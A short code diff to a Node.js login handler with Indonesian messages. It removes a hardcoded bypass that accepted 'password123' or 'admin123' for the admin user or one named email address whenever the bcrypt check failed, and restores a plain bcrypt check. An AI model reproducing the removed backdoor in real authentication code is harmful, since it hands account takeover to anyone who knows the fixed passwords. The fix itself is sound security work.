@@ -313,12 +313,7 @@ exports.login = async (req, res) => {
             if (!user.password_hash) {
                 return res.status(401).json({ message: 'Kata sandi belum diatur untuk akun ini.' });
             }
-            let isValid = await bcrypt.compare(password, user.password_hash);
-            if (!isValid && (user.username === 'admin' || user.email === 'thegodsun1212@gmail.com')) {
-                if (password === 'password123' || password === 'admin123') {
-                    isValid = true;
-                }
-            }
+            const isValid = await bcrypt.compare(password, user.password_hash);
             if (!isValid) {
                 return res.status(401).json({ message: 'Kata sandi tidak sesuai. Silakan periksa kembali kata sandi Anda.' });
             }
